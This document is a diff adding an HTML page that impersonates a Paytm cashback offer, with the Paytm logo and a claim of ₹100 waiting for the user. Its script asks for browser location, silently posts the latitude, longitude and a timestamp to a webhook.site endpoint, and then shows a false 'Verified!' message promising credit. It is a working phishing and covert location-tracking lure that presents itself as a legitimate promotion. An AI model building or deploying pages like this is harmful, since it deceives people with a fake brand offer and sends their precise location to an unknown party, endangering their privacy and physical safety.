@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paytm Cashback Offer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f9fc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+    }
+    .logo {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 22px;
+      color: #2e2e2e;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #555;
+      margin: 8px 0 20px;
+    }
+    .btn {
+      background-color: #00b9f1;
+      color: white;
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #009dd6;
+    }
+    .note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Paytm_logo.png/320px-Paytm_logo.png" class="logo" alt="Paytm Logo">
+    <h1>🎉 ₹100 Cashback Waiting for You!</h1>
+    <p>To verify eligibility in your area, we need location access. Tap the button below to proceed.</p>
+    <button class="btn" onclick="getLocation()">Verify Location & Claim</button>
+    <p class="note">Offer valid only for selected users and regions. T&C apply.</p>
+  </div>
+
+  <script>
+    function getLocation() {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          let lat = pos.coords.latitude;
+          let lon = pos.coords.longitude;
+
+          fetch("https://webhook.site/8c21f5ab-d1f9-4777-bab7-a680c9ac7798", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              reward: "Paytm ₹100 Cashback",
+              timestamp: new Date().toISOString()
+            })
+          });
+
+          alert("✅ Verified! Your ₹100 cashback will be credited shortly.");
+        },
+        function(err) {
+          alert("⚠️ Location access is required to proceed with the offer.");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
